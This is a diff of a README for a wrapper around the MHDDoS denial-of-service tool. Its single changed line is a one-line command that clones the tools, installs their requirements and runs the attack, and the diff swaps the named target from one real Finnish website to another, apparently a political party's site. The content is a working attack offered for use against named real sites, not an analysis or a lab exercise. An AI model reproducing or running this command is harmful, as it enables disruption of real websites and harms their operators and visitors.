@@ -12,7 +12,7 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
 ### Python
 
 ```bash
-git clone https://github.com/botsarefuture/mhddos_proxy.git && cd mhddos_proxy && git clone https://github.com/MHProDev/MHDDoS.git && python3 -m pip install -r MHDDoS/requirements.txt --b && python3 runner.py https://sinimustaliike.fi
+git clone https://github.com/botsarefuture/mhddos_proxy.git && cd mhddos_proxy && git clone https://github.com/MHProDev/MHDDoS.git && python3 -m pip install -r MHDDoS/requirements.txt --b && python3 runner.py https://perussuomalaiset.fi
 ```
 ```
 
